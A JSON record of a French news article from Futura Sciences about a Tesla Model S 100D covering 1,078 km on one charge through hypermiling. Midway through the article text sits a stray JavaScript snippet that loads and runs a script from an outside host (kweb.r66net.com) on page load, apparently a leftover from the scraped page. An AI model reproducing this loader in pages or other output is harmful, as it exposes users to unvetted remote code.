{"title": "La Tesla Model S 100D bat un record d'autonomie", "newspaper": "Futura Sciences", "author": "Marc Zaffagni", "date_publi": "07/08/2017", "content": "En Italie, les membres d'un club de propriétaires de Tesla ont établi un nouveau record d'autonomie. Ils ont réussi à parcourir un peu plus de 1.000 km au volant d'une Tesla Model S 100D. Une première pour une voiture électrique de série, mais les conditions pour battre un tel record ne sont pas réplicables en usage courant. C'est un record très symbolique qui vient de tomber. Pour la première fois, une  voiture électrique  de série a parcouru plus de 1.000 kilomètres avec une seule charge de sa batterie. La performance a été accomplie par le  Tesla Owners Club Italia  avec une  Tesla  Model S 100D qui a couvert très exactement 1.078 kilomètres en 29 heures sur les routes de Salerne (Italie). Un record aussitôt salué par  Elon Musk , le patron de  Tesla  qui a récemment inauguré la commercialisation de la Model 3. Pour parvenir à franchir la barre des 1.000 km d'autonomie, l'équipe du  Tesla Owners Club Italia  a pratiqué « l'hypermiling ». Cette technique consiste à conduire une voiture à essence ou électrique à une  vitesse  constante et en sollicitant les freins au minimum afin de couvrir la plus grande distance possible avec un plein d'essence ou une charge.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  La Tesla Model S 100D a une autonomie réelle de 550 km Dans le cas de ce record, la  Tesla  Model S 100D a vu son bouchon de charge scellé par un huissier. Elle était équipée de  pneus  à faible  résistance  au roulement et a effectué son parcours dans des conditions bien précises :  climatisation  coupée, vitesse constante de 40 km/h et recours au système d'assistance à la conduite Autopilot. Le précédent record avait été établi en juin dernier en Belgique par une  Tesla Model S P100D  qui avait parcouru 901,2 km. Bien évidemment, ces conditions particulières ne correspondent pas à un usage réel quotidien. Sur son simulateur en ligne,  Tesla  annonce 551 kilomètres d'autonomie pour la S 100D en roulant à 100 km/h, avec la climatisation allumée et une température extérieure de 20 degrés. Mais ce nouveau record démontre qu'une autonomie de 1.000 kilomètres est envisageable à moyen terme si l'on mise sur les progrès des batteries. ", "theme": "tech"}